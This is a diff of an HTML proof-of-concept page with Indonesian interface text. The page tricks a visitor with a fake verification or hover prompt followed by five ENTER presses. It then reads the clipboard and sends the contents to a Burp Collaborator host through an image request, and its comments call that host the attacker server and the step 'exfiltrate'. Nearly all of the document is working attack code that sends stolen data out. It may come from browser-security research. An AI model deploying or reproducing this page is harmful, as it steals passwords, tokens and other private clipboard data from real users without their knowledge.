@@ -1,76 +1,66 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Validasi Clipboard (Keyboard OK)</title>
+  <title>Hybrid Exploit (Arc Only)</title>
   <style>
     body {
       font-family: sans-serif;
       text-align: center;
       padding-top: 100px;
     }
-    button {
+    #hoverBox {
+      display: inline-block;
+      padding: 30px 60px;
+      background: #eee;
+      border: 2px dashed #999;
       font-size: 18px;
-      padding: 12px 24px;
       cursor: pointer;
     }
     #msg {
       margin-top: 20px;
-      font-size: 16px;
     }
     #result {
-      margin-top: 30px;
+      margin-top: 20px;
       font-weight: bold;
       color: green;
-      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
 
-  <h2>Verifikasi Pengguna</h2>
-  <button id="validateBtn" autofocus>Tekan ENTER atau klik untuk validasi awal</button>
-  <div id="msg">Silakan tekan tombol di atas</div>
+  <h2>Arahkan kursor ke kotak lalu tekan ENTER 5x</h2>
+  <div id="hoverBox">▶ Hover di sini</div>
+  <div id="msg">Menunggu interaksi...</div>
   <div id="result"></div>
 
   <script>
-    let ready = false;
-    let counter = 0;
+    let hovered = false;
+    let count = 0;
     let triggered = false;
-    let clipboardContent = "";
 
-    document.getElementById("validateBtn").addEventListener("click", () => {
-      if (!document.hasFocus()) {
-        document.getElementById("msg").innerText = "❌ Tab tidak fokus!";
-        return;
-      }
-
-      navigator.clipboard.readText()
-        .then(text => {
-          clipboardContent = text;
-          ready = true;
-          document.getElementById("msg").innerText = "✅ Validasi berhasil. Sekarang tekan ENTER 5x untuk lanjut.";
-        })
-        .catch(err => {
-          document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
-        });
+    document.getElementById("hoverBox").addEventListener("mouseover", () => {
+      hovered = true;
+      document.getElementById("msg").innerText = "Kursor terdeteksi. Tekan ENTER 5x...";
     });
 
     document.body.addEventListener("keydown", (e) => {
-      if (!ready || triggered) return;
-      if (e.key === "Enter") {
-        counter++;
+      if (hovered && e.key === "Enter" && !triggered) {
+        count++;
+        document.getElementById("msg").innerText = `ENTER ditekan (${count}/5)...`;
 
-        document.getElementById("msg").innerText = `Tekan ENTER (${counter}/5)...`;
-
-        if (counter >= 5) {
+        if (count >= 5) {
           triggered = true;
-          document.getElementById("msg").innerText = "📋 Clipboard berhasil dibaca!";
-          document.getElementById("result").innerText = "📋 Isi Clipboard:\n" + clipboardContent;
+          document.getElementById("msg").innerText = "📋 Membaca clipboard...";
 
-          // Optional: kirim ke server attacker
-          const img = new Image();
-          img.src = "https://mndf85nuwztx9glnwx47e0nr4ia9yy.burpcollaborator.net/log?clip=" + encodeURIComponent(clipboardContent);
+          navigator.clipboard.readText().then(text => {
+            document.getElementById("result").innerText = "📋 Clipboard:\n" + text;
+
+            // exfiltrate
+            const img = new Image();
+            img.src = "https://your-collab.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
+          }).catch(err => {
+            document.getElementById("msg").innerText = "❌ Gagal: " + err;
+          });
         }
       }
     });
